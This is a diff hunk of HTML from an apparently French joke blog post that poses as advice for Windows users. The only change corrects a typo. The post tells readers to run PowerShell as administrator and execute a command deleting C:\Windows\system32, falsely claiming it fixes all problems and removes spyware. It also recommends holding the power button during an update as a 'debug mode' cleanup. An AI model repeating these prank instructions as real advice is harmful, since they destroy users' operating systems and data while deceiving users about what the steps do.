@@ -21,7 +21,7 @@
 &lt;h3 id=&#34;la-solution-software&#34;&gt;La solution &amp;ldquo;software&amp;rdquo;&lt;/h3&gt;
 &lt;p&gt;Cette solution utilise la puissance des outils préintégrés dans notre cher Fenêtre. Ouvrez powershell en mode administrateur et entrez:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;nb&#34;&gt;del &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system32&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ceci va résoudre tout vos soucis tout en désactivant tout les spywares! Essayer le!&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ceci va résoudre tout vos soucis tout en désactivant tout les spywares! Essayez le!&lt;/p&gt;
 &lt;h3 id=&#34;la-solution-finale-aka-la-solution-hardware&#34;&gt;La solution finale a.k.a la solution &amp;ldquo;hardware&amp;rdquo;&lt;/h3&gt;
 &lt;p&gt;Il peut arriver que la solution software ne fonctionne pas avec votre version de Windows, ne vous inquiétez pas! Vous pouvez appliquer la méthode suivante!
 Quand Windows vous indique qu&amp;rsquo;il effectue un mise a jour, appuyer pendant une dizaine de secondes sur le bouton d&amp;rsquo;alimentation de votre ordinateur. Cela va activer le &amp;ldquo;mode debug&amp;rdquo; qui va automatiquement faire un &amp;ldquo;cleanup&amp;rdquo; de votre système.
